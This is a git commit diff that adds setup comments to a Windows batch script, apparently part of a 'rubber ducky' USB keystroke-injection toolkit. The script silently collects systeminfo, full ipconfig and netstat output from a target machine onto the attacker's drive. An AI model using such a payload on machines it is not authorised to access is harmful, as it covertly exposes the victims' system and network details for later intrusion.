290f00feb1b0dd2654094feeb2c0adf743605392
GuessMyHat <98121795+GuessMyHat@users.noreply.github.com>
2022-07-21 23:26:34 +0200

    Update information_gathering.bat

--- Users/Hidden script injection/information_gathering.bat
+++ Users/Hidden script injection/information_gathering.bat
@@ -1,5 +1,7 @@
 @echo off
+REM Remember to change "E:\" with your current rubber ducky drive letter
 cd /D E:\output
+REM The \output directory must be created before, otherwise you can type your own PATH
 	systeminfo 1>&2> .\sysinfo.txt
 	ipconfig /all 1>&2> .\ipconfig.txt
 	netstat -nao 1>&2> .\hostports.txt;
